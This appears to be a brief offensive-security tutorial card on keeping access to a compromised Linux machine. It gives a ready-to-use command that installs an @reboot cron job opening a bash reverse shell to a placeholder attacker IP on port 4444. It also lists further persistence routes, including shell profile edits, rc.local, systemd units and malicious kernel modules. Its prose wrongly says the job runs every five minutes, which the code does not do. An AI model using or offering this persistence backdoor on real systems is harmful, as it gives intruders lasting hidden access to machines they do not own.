Establishing Persistence on Linux
Securing your foothold on a compromised Linux system.
Code Example: Cron Job
# Example: Add a cron job on Linux for persistence
(crontab -l 2>/dev/null; echo "@reboot /bin/bash -i >& /dev/tcp/YOUR_ATTACKER_IP/4444 0>&1") | crontab -
Concrete Example

Adding a cron job to a user's crontab that executes a reverse shell script every 5 minutes ensures continuous access, even after reboots.

Linux Persistence Mechanisms
  • •User Configuration Files: Modify ~/.bashrc or ~/.profile.
  • •`/etc/rc.local`: Add entries for execution at boot (if available).
  • •Cron Jobs (`crontab -e`): Schedule commands to run at intervals or reboot.
  • •Systemd Services: Create or modify systemd unit files.
  • •Malicious Kernel Modules: Install custom kernel modules for deep persistence.
Common Mistake

Using incorrect absolute paths for payloads or forgetting to make persistence scripts executable.

Key Takeaway

Linux persistence relies on leveraging system schedulers and configuration files, requiring careful path and permission management.
